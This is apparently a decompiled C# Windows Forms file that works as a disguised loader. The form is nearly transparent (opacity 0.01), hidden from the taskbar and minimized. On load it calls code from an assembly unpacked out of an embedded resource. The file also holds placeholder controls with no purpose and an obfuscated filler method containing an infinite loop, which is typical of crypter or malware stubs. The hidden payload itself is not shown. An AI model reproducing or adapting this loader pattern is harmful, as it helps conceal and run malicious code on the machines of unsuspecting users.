using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Pass.My.Resources;
using x;

namespace Pass;

[DesignerGenerated]
public class pass : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("Button1")]
	private Button button_0;

	[AccessedThroughProperty("Button2")]
	private Button button_1;

	[AccessedThroughProperty("Button3")]
	private Button button_2;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox checkBox_0;

	[AccessedThroughProperty("Label1")]
	private Label label_0;

	[AccessedThroughProperty("Label2")]
	private Label label_1;

	[AccessedThroughProperty("LinkLabel1")]
	private LinkLabel linkLabel_0;

	[AccessedThroughProperty("PictureBox2")]
	private PictureBox pictureBox_0;

	[AccessedThroughProperty("RadioButton1")]
	private RadioButton radioButton_0;

	[AccessedThroughProperty("ComboBox1")]
	private ComboBox comboBox_0;

	[AccessedThroughProperty("Button4")]
	private Button button_3;

	[AccessedThroughProperty("ComboBox2")]
	private ComboBox comboBox_1;

	public static Assembly loads = Assembly.Load(Resources.x);

	public pass()
	{
		((Form)this).add_Load((EventHandler)pass_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0688: Unknown result type (might be due to invalid IL or missing references)
		//IL_0692: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(pass));
		vmethod_1(new Button());
		vmethod_3(new Button());
		vmethod_5(new Button());
		vmethod_7(new CheckBox());
		vmethod_9(new Label());
		vmethod_11(new Label());
		vmethod_13(new LinkLabel());
		vmethod_15(new PictureBox());
		vmethod_17(new RadioButton());
		vmethod_19(new ComboBox());
		vmethod_21(new Button());
		vmethod_23(new ComboBox());
		((ISupportInitialize)vmethod_14()).BeginInit();
		((Control)this).SuspendLayout();
		Button obj = vmethod_0();
		Point location = new Point(73, 34);
		((Control)obj).set_Location(location);
		((Control)vmethod_0()).set_Name("Button1");
		Button obj2 = vmethod_0();
		Size size = new Size(75, 23);
		((Control)obj2).set_Size(size);
		((Control)vmethod_0()).set_TabIndex(0);
		((ButtonBase)vmethod_0()).set_Text("Button1");
		((ButtonBase)vmethod_0()).set_UseVisualStyleBackColor(true);
		Button obj3 = vmethod_2();
		location = new Point(100, 132);
		((Control)obj3).set_Location(location);
		((Control)vmethod_2()).set_Name("Button2");
		Button obj4 = vmethod_2();
		size = new Size(75, 23);
		((Control)obj4).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(1);
		((ButtonBase)vmethod_2()).set_Text("Button2");
		((ButtonBase)vmethod_2()).set_UseVisualStyleBackColor(true);
		Button obj5 = vmethod_4();
		location = new Point(241, 33);
		((Control)obj5).set_Location(location);
		((Control)vmethod_4()).set_Name("Button3");
		Button obj6 = vmethod_4();
		size = new Size(75, 23);
		((Control)obj6).set_Size(size);
		((Control)vmethod_4()).set_TabIndex(2);
		((ButtonBase)vmethod_4()).set_Text("Button3");
		((ButtonBase)vmethod_4()).set_UseVisualStyleBackColor(true);
		((ButtonBase)vmethod_6()).set_AutoSize(true);
		CheckBox obj7 = vmethod_6();
		location = new Point(90, 105);
		((Control)obj7).set_Location(location);
		((Control)vmethod_6()).set_Name("CheckBox1");
		CheckBox obj8 = vmethod_6();
		size = new Size(81, 17);
		((Control)obj8).set_Size(size);
		((Control)vmethod_6()).set_TabIndex(3);
		((ButtonBase)vmethod_6()).set_Text("CheckBox1");
		((ButtonBase)vmethod_6()).set_UseVisualStyleBackColor(true);
		vmethod_8().set_AutoSize(true);
		Label obj9 = vmethod_8();
		location = new Point(25, 95);
		((Control)obj9).set_Location(location);
		((Control)vmethod_8()).set_Name("Label1");
		Label obj10 = vmethod_8();
		size = new Size(39, 13);
		((Control)obj10).set_Size(size);
		((Control)vmethod_8()).set_TabIndex(4);
		vmethod_8().set_Text("Label1");
		vmethod_10().set_AutoSize(true);
		Label obj11 = vmethod_10();
		location = new Point(114, 73);
		((Control)obj11).set_Location(location);
		((Control)vmethod_10()).set_Name("Label2");
		Label obj12 = vmethod_10();
		size = new Size(39, 13);
		((Control)obj12).set_Size(size);
		((Control)vmethod_10()).set_TabIndex(5);
		vmethod_10().set_Text("Label2");
		((Label)vmethod_12()).set_AutoSize(true);
		LinkLabel obj13 = vmethod_12();
		location = new Point(88, 162);
		((Control)obj13).set_Location(location);
		((Control)vmethod_12()).set_Name("LinkLabel1");
		LinkLabel obj14 = vmethod_12();
		size = new Size(59, 13);
		((Control)obj14).set_Size(size);
		((Control)vmethod_12()).set_TabIndex(6);
		((Label)vmethod_12()).set_TabStop(true);
		vmethod_12().set_Text("LinkLabel1");
		PictureBox obj15 = vmethod_14();
		location = new Point(214, 57);
		((Control)obj15).set_Location(location);
		((Control)vmethod_14()).set_Name("PictureBox2");
		PictureBox obj16 = vmethod_14();
		size = new Size(100, 50);
		((Control)obj16).set_Size(size);
		vmethod_14().set_TabIndex(8);
		vmethod_14().set_TabStop(false);
		((ButtonBase)vmethod_16()).set_AutoSize(true);
		RadioButton obj17 = vmethod_16();
		location = new Point(-27, 196);
		((Control)obj17).set_Location(location);
		((Control)vmethod_16()).set_Name("RadioButton1");
		RadioButton obj18 = vmethod_16();
		size = new Size(90, 17);
		((Control)obj18).set_Size(size);
		((Control)vmethod_16()).set_TabIndex(9);
		vmethod_16().set_TabStop(true);
		((ButtonBase)vmethod_16()).set_Text("RadioButton1");
		((ButtonBase)vmethod_16()).set_UseVisualStyleBackColor(true);
		((ListControl)vmethod_18()).set_FormattingEnabled(true);
		ComboBox obj19 = vmethod_18();
		location = new Point(113, 2);
		((Control)obj19).set_Location(location);
		((Control)vmethod_18()).set_Name("ComboBox1");
		ComboBox obj20 = vmethod_18();
		size = new Size(121, 21);
		((Control)obj20).set_Size(size);
		((Control)vmethod_18()).set_TabIndex(10);
		Button obj21 = vmethod_20();
		location = new Point(13, 13);
		((Control)obj21).set_Location(location);
		((Control)vmethod_20()).set_Name("Button4");
		Button obj22 = vmethod_20();
		size = new Size(75, 23);
		((Control)obj22).set_Size(size);
		((Control)vmethod_20()).set_TabIndex(11);
		((ButtonBase)vmethod_20()).set_Text("Button4");
		((ButtonBase)vmethod_20()).set_UseVisualStyleBackColor(true);
		((ListControl)vmethod_22()).set_FormattingEnabled(true);
		ComboBox obj23 = vmethod_22();
		location = new Point(37, 57);
		((Control)obj23).set_Location(location);
		((Control)vmethod_22()).set_Name("ComboBox2");
		ComboBox obj24 = vmethod_22();
		size = new Size(121, 21);
		((Control)obj24).set_Size(size);
		((Control)vmethod_22()).set_TabIndex(12);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(116, 10);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_22());
		((Control)this).get_Controls().Add((Control)(object)vmethod_20());
		((Control)this).get_Controls().Add((Control)(object)vmethod_18());
		((Control)this).get_Controls().Add((Control)(object)vmethod_16());
		((Control)this).get_Controls().Add((Control)(object)vmethod_14());
		((Control)this).get_Controls().Add((Control)(object)vmethod_12());
		((Control)this).get_Controls().Add((Control)(object)vmethod_10());
		((Control)this).get_Controls().Add((Control)(object)vmethod_8());
		((Control)this).get_Controls().Add((Control)(object)vmethod_6());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("pass");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((ISupportInitialize)vmethod_14()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Button vmethod_0()
	{
		return button_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(Button WithEventsValue)
	{
		button_0 = WithEventsValue;
	}

	[SpecialName]
	internal virtual Button vmethod_2()
	{
		return button_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(Button WithEventsValue)
	{
		button_1 = WithEventsValue;
	}

	[SpecialName]
	internal virtual Button vmethod_4()
	{
		return button_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_5(Button WithEventsValue)
	{
		button_2 = WithEventsValue;
	}

	[SpecialName]
	internal virtual CheckBox vmethod_6()
	{
		return checkBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_7(CheckBox WithEventsValue)
	{
		checkBox_0 = WithEventsValue;
	}

	[SpecialName]
	internal virtual Label vmethod_8()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_9(Label WithEventsValue)
	{
		label_0 = WithEventsValue;
	}

	[SpecialName]
	internal virtual Label vmethod_10()
	{
		return label_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_11(Label WithEventsValue)
	{
		label_1 = WithEventsValue;
	}

	[SpecialName]
	internal virtual LinkLabel vmethod_12()
	{
		return linkLabel_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_13(LinkLabel WithEventsValue)
	{
		linkLabel_0 = WithEventsValue;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_14()
	{
		return pictureBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_15(PictureBox WithEventsValue)
	{
		pictureBox_0 = WithEventsValue;
	}

	[SpecialName]
	internal virtual RadioButton vmethod_16()
	{
		return radioButton_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_17(RadioButton WithEventsValue)
	{
		radioButton_0 = WithEventsValue;
	}

	[SpecialName]
	internal virtual ComboBox vmethod_18()
	{
		return comboBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_19(ComboBox WithEventsValue)
	{
		comboBox_0 = WithEventsValue;
	}

	[SpecialName]
	internal virtual Button vmethod_20()
	{
		return button_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_21(Button WithEventsValue)
	{
		button_3 = WithEventsValue;
	}

	[SpecialName]
	internal virtual ComboBox vmethod_22()
	{
		return comboBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_23(ComboBox WithEventsValue)
	{
		comboBox_1 = WithEventsValue;
	}

	public void Gr0wlit_I19Cs5B8O()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			new decimal(-2070746965L);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
			try
			{
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void pass_Load(object sender, EventArgs e)
	{
		x.X();
	}
}
